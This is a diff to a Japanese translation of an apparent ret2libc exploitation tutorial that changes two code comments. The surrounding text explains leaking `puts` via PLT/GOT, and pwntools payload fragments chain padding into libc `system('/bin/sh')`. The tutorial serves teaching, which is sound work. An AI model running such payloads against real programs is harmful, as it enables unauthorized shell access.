@@ -42,7 +42,7 @@ p = process()
 次に、`puts` の実アドレスをリークするペイロードを送ります。前に述べたとおり、関数の PLT エントリを呼ぶのは関数自体を呼ぶのと同じです。パラメータが GOT エントリを指すようにすれば、その実際の場所が出力されます。これは、C では文字列引数が実際には文字列の場所を指す**ポインタ**を受け取るためで、(場所がわかっている)GOT エントリを指すようにすれば、それが出力されるのです。
 
 ```python
-p.recvline()        # just receive the first output
+p.recvline()        # 最初の出力だけ受け取る
 
 payload = flat(
     'A' * 32,
@@ -72,7 +72,7 @@ log.success(f'LIBC base: {hex(libc.address)}')
 payload = flat(
     'A' * 32,
     libc.sym['system'],
-    libc.sym['exit'],            # exit is not required here, it's just nicer
+    libc.sym['exit'],            # ここでは exit は必須ではない。あった方が見栄えがいいだけ
     next(libc.search(b'/bin/sh\x00'))
 )
 
